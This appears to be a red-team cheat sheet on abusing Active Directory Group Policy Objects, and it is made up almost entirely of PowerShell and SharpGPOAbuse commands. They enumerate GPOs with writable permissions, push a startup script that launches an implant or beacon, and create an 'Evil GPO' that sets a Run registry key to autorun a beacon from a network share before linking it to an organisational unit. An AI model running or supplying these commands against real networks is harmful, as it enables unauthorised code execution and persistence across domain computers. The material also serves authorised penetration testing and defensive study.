# Abuse a Vulnerable GPO

[[SharpGPOAbuse]] 

```powershell
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "<Domain SID Prefix>-[\d]{4,10}" } # Identify vulnerable GPOs
Get-DomainGPO -Identity "<Object DN>" | select displayName, gpcFileSysPath # Get managers of the GPO as SID
ConvertFrom-SID <Object SID> # Convert the SID to a principal name
Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName # Identify the OUs managed by this GPO
Get-DomainComputer -SearchBase "OU=<OU Name>,DC=<DC subd>,DC=<DC domain>,DC=<DC TLD>" | select dnsHostName # Identify machines in an OU
SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b <implant or beacon>" --GPOName "<GPO Name>"
```

# Abuse GPO Links
```powershell
Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=<DC subd>,DC=<DC domain>,DC=<DC TLD>" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier } # Search for a condition where we can link a GPO

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "<VUlnerable GPO>" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl # Check for WriteProperty over the GPO for linking

New-GPO -Name "Evil GPO" # Create the evil GPO (only available with additional RSAT commands)

Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString # Example Evil GPO that sets a reg key to autorun a beacon

Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=<affected OU>,DC=<DC subd>,DC=<DC domain>,DC=<DC TLD>"
```
